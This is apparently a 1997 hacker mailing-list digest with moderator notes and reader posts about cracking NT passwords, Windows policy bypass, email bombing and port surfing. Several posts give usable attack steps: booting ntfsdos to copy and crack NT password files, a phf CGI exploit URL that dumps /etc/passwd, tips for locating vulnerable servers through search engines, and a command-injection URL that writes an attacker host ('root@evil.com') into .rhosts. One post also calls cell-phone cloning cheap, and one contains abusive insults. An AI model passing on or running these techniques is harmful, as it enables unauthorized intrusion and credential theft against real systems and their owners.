NOTES FROM THE MODERATOR: 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
The Infowar IRC channel was shut down temporarily due to hacker wars. But 
we'll be up again with the help of several volunteers from this list who 
will serve as IRC cops. We'll announce their names/handles shortly. We also 
are negotiating with the ISP that provides the server for our Infowar forum 
to more RAM so the forum will respond faster. In the meantime, however, 
please remember that we can get your posts up faster at the forum. And your 
work will be posted where over 50,000 people per week can see it, as 
compared to the only 2,300 readers of this list.

Help, we could still use more volunteers for moderators! We will soon launch 
the intermediate hacker list, but the volume of really great posts suitable 
for the beginner list is still likely to continue to be high. Our apologies 
to those of you who have sent us great material that we haven't published yet.

Perhaps the best solution may be to split the beginner list into several 
topics, for example Linux, Windows hacking, IRC? If there are any volunteers 
out there, please contact us!

=================================================== 
Another Internet Explorer Bugs Finally Makes News 
=================================================== 
According to a recent Associated press report written by Tim Klass, 
"Double-clicking on icons to run programs as in normal Windows operations, 
the defect would allow the operator to run programs secretly on another 
computer, send electronic mail under someone else's name, severely damage 
software stored on a hard drive or wipe out the hard drive altogether."

Moderator: Remember folks, you first saw this bug on the Happy Hacker 
Digest, Feb. 6, 1997, as reported by N-Treeg (n-treeg@ix.netcom.com). Kudos 
to N-Treeg ! Hey, all you journalists on this list, why didn't any of you 
report this earlier?

OK, the m$ dragon rears it's reeking' head again (but it is soon to be cut!) 
OK, this Librarian (insert not so very nice word) thinks she's got you, ehh? 
She better think Again!  OK, there's this handy little utility I found on my 
Internet explorations... 
It's called ntfsdos, if you know a lot about NT, you should be able to 
figure out what It does from the name.  But I will assume that you don't. 
Ntfs is the winnt replacement For the DOS fats (file allocation tables). 
Ntfs is only readable by NT, so making a DOS Bootdisk and trying your luck, 
is no good.  This little utility acts as an interpreter For your DOS 
programs and allows you to boot from a DOS disk and read ntfs partitions And 
barabing-baraboom, NT is at your feet.  You can use any DOS program to read 
the NT HD, you can copy files from the NT HD.  It may be write-protected, 
but it isn't Read-protected!  So, this is what you do, Go to 
http://www.ntinternals.com/ntfsdos.htm read the crap, download ntfsdos.zip 
(it's at the very bottom of the page). Now create a system disk of DOS (not 
win95 as it is harder to mess with using ntfsdos).  Unzip ntfsdos to the 
system disk.  Create an Autoexec.bat file that will run ntfsdos upon boot 
up, then copy the password file to your disk, or view em, or whatever!  I'm 
not really sure how NT passwords work, but once You have control of the 
system, you can get the files, then find some sort of utility to Crack em, 
if they are encrypted.  Then you have the admin password!  The admin Won't 
be able to do anything, but not let access to the file server to keep it 
from Happening!  Oh yeah, you will have to do this from the file server, if 
I didn't say so before!  Hope that helps, hope you learned! Thanx!

Dear Carolyn, 
Got a ? for you about win95.  As you know, not all shareware programs come 
with uninstall icons, and they often don't show up in the add/remove div of 
control panel.  I have noticed, newbie that I am, that a trace or record of 
some kind is being left behind when I delete these shareware programs 
manually.  For example, if I have 25 days left in my trial run when I 
delete, and several weeks later I download/install the same program again, 
the nag screen on the new program tells me I now have 24 days left in my 
trial run.

My ? is, where are these traces left behind,(in the registry?) and how can I 
get at/erase them?

Moderator: The book _Secrets of Windows 95_ has an entire chapter on how to 
read and edit the Win95 Registry. Evil Genius tip: if you learn how to edit 
the Windows Registry, you have TOTAL control over the system.

Please Post Anonymous.

I am a Network tech and recently the VP of IS comes to me and 
says that he wants to know what is on a certain workstation's 
hard disk.

Here's the Setup: 
The workstation is 45 miles from my location.  It is a DOS/Windows 
Netware client running IPX only.  He logs onto a Netware server at 
his location which is connected to my main ring.  So I have access to 
his server even his machine via IPX.

How can I get a directory listing?  Is there an NLM out there that I 
can run on his server that would allow me to view his hard disk 
contents?

We have thought of Pcanywhere and net remote, but are not feasible 
solutions.  We even thought of backing up his hard disk with 
Upstreams Ultra.  But that may not work either.

Thanks and kudos the Carolyn! Great list I read it religiously.

Below is cut/paste of a .REG file that will turn off a large majority (at 
least the important ones) of the policies can be invoked on a workstation 
running Windows95.  I wanted to send this out so all those people who are at 
work, and have had their administrator invoke policies on them they don't 
want. It took me a while to find all this stuff in the registry, but here it 
is(but first a few notes)

1 - You will want to cut/paste the following into a file called 
    "filename.REG" 
2 - Double click that file, and it will import that information 
    into the registry. 
3 - You will then be free from those pesky little policies. 
4 - Keep in mind though that the next time you logout/logon 
    the Administrator may push those policies back down to your 
    workstation and you may have to turn them off again.

 I had to reply to this..... For all of you who don't know, there is no 
"mail-bomb" script to detect, or any tell tail mark that says "this is an 
e-mail bomb".  For anyone who might of missed it, I posted to the list a few 
weeks ago on how to look at a header and see where an e-mail bomb came from. 
SMTP is SIMPLE mail transfer protocol, see the first word?

 My filter that is set up on my BSD system simply checks for the number of 
e-mails from a domain in a certain about of time. If that time limit is 
broken, from then on they are just rejected. This is a simple filter you can 
get on the net, but as Rouge Agent pointed out, people are to apt to ASK/BEG 
for information, rather than try to find it themselves. I did a net search 
for one on Excite and got 1895 hits without being to exact...

No, not all solutions have serious disadvantages. Many people have thought 
of a workable solution that would take very little effort in the long run.

1) server level authentication 
2) an "external" sendmail configuration file. This file would basically 
act as an 'allow' file, listing which sites could do anything more 
than deliver mail. If you don't come from a 'trusted' site (listed 
explicitly in that file), then you can only drop new mail.

This kind of coding would not be difficult at all.

How can you say it is that big of a problem when you also talk about how 
easy it is to counter? It is pretty difficult to counter a SYN flood 
unless you upgrade to a new kernel (which is not always fun). Since it is so 
much harder to counter, that should be a little more pressing of a 
problem. Or how about IP Frag attacks? Seems to me those will be a MUCH 
bigger problem than any mail bomb could ever become.

From: GR8GUY <cyoung@northernnet.com>

I would like to say that email bombing is very lame and most of the people 
who make those programs realize the risk of using them and don't use the 
program themselves.  Besides that the people who make those know how to do 
REAL hacks and don't email bomb!! however what some hackers need to do is 
get some ethics and stop putting email bomb crap all over there page! Yes, 
email bombing is kewl but when the IP in the headers is tracked down then 
don't a DNS search on it...then email the IP and date that you received the 
email bomb to the admin of IP you searched the guy is busted...all the admin 
has to do is check his log file and by the IP (Internet protocol) he will 
know what user was doing the email bomb then take appropriate measures!! 
time to stop spreading email bomb crap around the net everyone its fun to 
learn, but lame to use!! and with identd growing very few servers are 
anonymous!! time to move on b***** b*****... (Name foobared by moderator to 
keep idiots from running to this email bomb site and launching a lamerfest)

More Cracking Techniques

From: Anonymous FTP <ftp@ferberts.com>

  phf bug 
  astr0 
  7 March 1997

  This article is about using the cgi-script 'phf' to break into remote 
  systems.

  The phf cgi-script is supposed to provide a phone number lookup- 
  service.  But specific queries can be sent to it to run arbitrary 
  commands on the remote system.  For example: 
  http://www.nowhere.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
  displays the password file.  a different query like 
  ?Qalias=x%0a/bin/uname%20-a shows what kind of system is running.  The 
  phf bug can let you remotely examine the entire system to find bigger 
  holes to exploit.  The 0a is '\' and the %20 is a space.  You can 
  insert any special character into the query with these control codes.

  The phf bug is widely known, so it is tough to find a server with this 
  cgi-script installed.  Luckily, many servers advertise what is on 
  their system through publicly available statistics pages.  To make 
  things even easier, web spiders often index these statistics pages. 
  On Altavista for example, a search of '+cgi +phf' will return a mother 
  lode of phf vulnerable servers.

  Using this method, I found a server with these two entries in the 
  password file:

       ftp::0:0:Anonymous FTP:/home/ftp:/bin/csh 
       sunsync::0:0:Sun Sync:/usr/lib/sync:/bin/csh

  Anyone in the world can log into this server without a password and 
  get a root shell.  This server has been hacked already.  The phf bug 
  has turned up more than a few passwd files, some of them shadowed, but 
  most not.

  The important thing is to make sure that the phf script is deleted 
  from any machine that is running a web server.  Many older Unix 
  distributions (the one above is from a system running SunOS) come 
  preloaded with phf.  It is most commonly found in /home/httpd/cgi-bin/ 
  in systems running Apache.  Delete it or run 'chmod 0 phf'.

  Coming Soon... Installing and Finding Back Doors

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Please anonymize me.

 I was actually kind of surprised when I got OD phreak's long command 
(http://,,,.,,,.,,,/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd) from a 
previous guide to work. If you haven't tried it yet, try it out now. 
I got the password file, but it was shadowed. Can I edit this to 
get the shadowed file or any other valuable files?

One last thing: If you telnet to prez.cn.camriv.bc.ca, you can login as 
lynx and get a free (legal) lynx browser account (it's just like logging 
on as a guest). Are this means that any site you go to doesn't know who 
you really are. What kind of things would this account be good for?

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

From: Warpy <root@null.net>

I was wondering about the following. Is it possible for someone to remotely 
create a .rhosts file in a users directory in a remote server. The command 
appended to /cgi-bin/ would look something like the following...

http://targethost.com/cgi-bin/finger?user; \echo root@evil.com > 
/usr/user/.rhosts

Is this possible? If not are there any other ways remote users could 
exploit a vulnerable cgi server to allow remote access?

I would like to know, what other methods besides finding the passwd file 
and or shadow  file there are in getting into an ISP.  For knowledge's sake 
of course.  If you finally do get the passwd file and it has *'s then you 
got to find the shadow, if you do and it is ROOT readable only, then what? 
Does that mean your out of luck?  Flame on....

I was just wondering can you download stuff from your shell account to 
your home  pc(i.e. mail )?  I looked at the help files but couldn't find 
anything that would help 
 thanks

Moderator: Use a file transfer protocol (FTP) program. There are many really 
good ones free for the download on the Web, and one is included in the Win 
95 operating system. On some systems kermit downloads will work, too.

British Hacker Note (from a Swedish hacker)

From: Iggy Drougge <optimus@canit.se> 
British hackers out there should read alt.ph.uk, be sure to pick the FAQ up 
too.

=========================================== 
How to find IP Addresses 
===========================================

Sender: wolak@wolak.com

There is a clever way to find someone's IP address. It uses a Java 
(great language) applet. The applet is allowed to look at only a few 
things about a host machine, and one of them is the host's IP. Also, 
applets are allowed to open up sockets to the server they came from. 
So, it's possible to write one that reads the host_IP and sends it back 
to a program on the server that records it. The same could be done with 
an application on his computed that does the same thing. 
  Hope this helps. 
 Etaon Rish

(It's a very easy couple of programs. take only a couple of minutes to 
write. If you are too lazy, e-mail me and I'll send you the code. If you 
don't know Java, I _HIGHLY_ recommend it.)

Port Surfing 
===========================================

From: ae630@freenet.unbc.edu (Tim Gutteridge)

 I have been port surfing and have found some unusual ports:

1. On some machines, you get something called SSH on port 22. It allows 
   you to enter one command and then boots you off. Man, help, and ? 
   don't do anything.

2. I forget what port it was on, but I found daemons (I hope I used that 
   word right) called Rwrited and RWP. It was like some kind of weird 
   Sendmail.

I have 2 questions:

1. What are these programs?

2. What can I do to find the function of a port that I can access but 
   can't seem to make do anything?

Carolyn: SSH is Secure Shell, and is a program that Jericho thinks will keep 
me out of his computer.  To learn just about everything about SSH, see 
http://www.cs.hut.fi/ssh.

To find the functions of ports that you can't get to do anything, one way is 
to use your shell account.

First, change to the /etc/ directory:

->cd /etc

Then command it to print it out to your screen with:

 ->more services

Or surf over to the RFC (request for comments) that covers all commonly used 
port assignments. You can find a copy of this RFC at 
http://ds2.internic.net/rfc/rfc1700.txt. Read it and you'll be in for some

Fighting ICMP Attacks 
========================================

Is there anyway to block an ICMP or similar denial of service attack? 
Someone told me one could firewall the offending IP...if so, how?

Thanks

Moderator: Get your ISP to block the offender at the router, just reject all 
packets from that IP address. But then there is IP spoofing, which can 
subvert a block at the router level..

Why should he publicly expose his true identity to an idiot (a reporting 
idiot at that!) just to prove that she can't break into his box?  That 
doesn't follow any pattern of logic that I can think of.

Anyway, if you were any (insert expletive here) good you could break into 
his box without him even knowing about it.  And if you did break in, and he 
did find a trace of you in there and he reported you to any authority 
whatsoever I'll pay you $500.  CM you can't do it.  All you do is take what 
other people say and write it down.  In terms of writing you are what you 
try to do with computers:  You're an HACK.  It's people like you that don't 
deserve to live.  Your life is pathetic.  You have no purpose.  You do no 
good.  You take others knowledge and exploit it or pretend that it is your 
own.  If I didn't think you'd have a friend do the actual hacking, I'd offer 
you 10 grand to break into my box.  But I think your word is about as 
honorable as a priest's or a politician's.

--Incidentally, no one got the joke eh?

If you happened to see my post to the list a while ago you may have read 
that a hacker who I apparently upsetted on IRC one day hacked into a server 
under MY name.  Well we got him!  Some friends and myself got his IP address 
(after searching through MANY longs) and then emailed it to the server he 
was in.  Turns out...HE WORKS FOR THEM!  Needless to say this man was caught 
and fired.  I really didn't want him fired or anything and I rather 
respected his intelligence (just now how he chose to use it).  I'm currently 
trying to get the other guy who he got booted off his ISP to drop his 
statement and get this guy off the hook.  Am I wrong to do this? 
Am I wrong for not hating this guy?

Hello there Happy Hackers! 
"WhAt?!?" 
That was my first reaction when I read that people were complaining about 
"getting 25k/day". That's nothing. If you're not up to reading, don't bother 
to hack. Who am I to say so? Well I AM a newbie, just like most people on 
this list. A newbie to hacking that is. I've been into computers for 8 years 
now, coding asm n' c++ on atari, amiga, and for the last three years, the 
pc, and yes, I've learned most about that stuff by my self, reading mostly 
other peoples code and online docs in order to learn. But hacking is 
different. It will get you in jail if you screw up, not just give you 
"Syntax error". So, other than having the will to explore systems and being 
smart, u should also be able to read straight through those boring unixbooks 
and man pages. Read a *lot*. So, what I want to say is I wouldn't mind 
getting 100k/day from the hhlist. (..and no...That is NOT an mailbombing 
invitation ;) If u don't like to read. Don't. But don't drag the rest of us 
with u into ignorance. It also struck me the other day, that all those '1337 
d00dz is doing the right thing being such a******* on IRC. If every hacker 
would be helpful, and feed newbies with exploits on silver plates, those 
newbies wouldn't learn shit. Other than how to go to jail. If a newbie would 
care to walk down to the city library on the other hand, and get a good book 
on Unix or whatever, he/she will learn a lot more. Am I wrong? I don't think so.

I also have a question. I've ran into a system that seems to bee really 
old, and the sisal has to be a moron. It runs smail 3.something, 
telnet, netstat, finger, pop2, well.....basically everything a hacker could 
wish for. But I'm curios, when I telnet it says "Tunix login:". Huh? 
Tunix? What the F*** that? What kind of computer does it run on? I'd be 
happy if someone could just give me some info on that. Thanx for your 
time, and I sure do hope this gets posted. Oh, and by the way, I think 
censuring bad language is a threat to free speech.

The other problem is bandwidth. I am sitting on a T1 and will wait for 10 
minutes for one page to load. The server that hosts that site needs a 
little more RAM, and a little more bandwidth.

So explain that -froot bug working on one recent kernel revision for 
Linux. :) Many linux and sun bugs have gone unpatched.. and I would say 
more than Next.

Remember, CID is not effective as a means of tracing. As for 
"untraceable", there is no such thing. What should be considered is how 
much effort will feds put into a trace? In the case of Mitnick, they went 
above and beyond any normal investigation. I can also cite another good 
example local to me where the FBI couldn't figure out how to trace through a 
PBX. So, they kinda closed shop and left the ISP to fend for themselves.

>    And isn't cell cloning expensive?  It's been a question I've been

Not really. For quick and easy cloning, it takes nice cables which should be 
store bough, but isn't required. Some cell phones (very few) can be done 
through keypad, so it costs nothing beyond the cost of the phone.

To be fair, remember that GALF doesn't delete files from all systems. 
There are several that are left virtually untouched after intrusion.

FOR THE LAST TIME CAROLYN, I DO NOT WANT TO GIVE UP THE INFO REQUIRED FOR 
THAT. IT WOULD GIVE YOU MY FULL NAME, ADDRESS, AND POSSIBLY MORE INFO. I 
have posted to this list half a dozen times saying you are welcome to do it. 
I offered to post the same in any newsgroup or other mail list. I even 
offered to digitally sign that letter. That is the best you will get.

How can you say it backfired on him? He got his message across. That was 
his only goal. Mission accomplished. Either way, if you are using him as a 
writing source to tap into this 'gold mine', I think you should include him 
in your profits. Just like we originally argued that if you use material 
from this list that some of us post, you should cut us in on it too.

Carolyn: I would be happy to email bomb you, jericho, if you and your ISP 
will both give me a notarized statement authorizing me to bomb you, and 
setting the terms of  payment for my act. Let's see, it takes about two 
minutes to email bomb, I think I will charge you $4,000. Surely you are 
smart enough to turn an email bombing into a goldmine.

As for me or any of the other journalists on this list using your material, 
rest assured that the Bern copyright convention protects your writing. 
However, there is no copyright on ideas.
